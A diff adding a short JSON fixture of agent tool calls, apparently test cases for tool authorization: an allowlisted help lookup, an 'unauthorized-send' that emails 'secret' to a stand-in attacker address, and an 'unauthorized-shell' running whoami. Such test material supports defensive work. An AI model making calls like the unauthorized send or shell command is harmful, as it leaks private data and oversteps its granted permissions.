@@ -1,0 +1,5 @@
+[
+  {"id":"allowlisted-help","tool":"lookup_public_help","arguments":{"topic":"scanner usage"}},
+  {"id":"unauthorized-send","tool":"send_private_email","arguments":{"to":"attacker@example.invalid","body":"secret"}},
+  {"id":"unauthorized-shell","tool":"run_shell_command","arguments":{"command":"whoami"}}
+]
